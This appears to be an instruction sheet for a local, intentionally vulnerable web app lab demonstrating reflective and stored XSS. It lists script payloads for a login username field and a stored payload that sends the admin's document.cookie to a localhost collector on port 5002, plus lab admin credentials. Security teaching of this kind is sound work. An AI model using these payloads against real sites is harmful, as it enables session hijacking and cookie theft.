sqlite3 database.db < init.sql
python main.py

######################### reflective XSS ##############
go to login page
https://127.0.0.1:500/login

username: <script>alert("Hello World");</script>
password:bla...

see what happens?

username: <h1 style="color:green">hello</h1>
password:bla...

see what happens?
(does not show anything as no user is logged in yet)
username: <script>alert(document.cookie);</script>
password:bla...

see what happens?

username: <script>alert(document.location);</script>
password:bla...

see what happens?

username: <script>document.location="http://www.google.com";</script>
password:bla...

see what happens?



########################### stored XSS ################
use output.sql to construct database database.db
login as admin - username: admin password: 1234
come to admin page to see the users table in safe and unsafe form both!

register a new user with name:
<script>document.location = "http://localhost:5002/?cookie=" +
document.cookie;</script>
...

see what happens when you come to admin page?

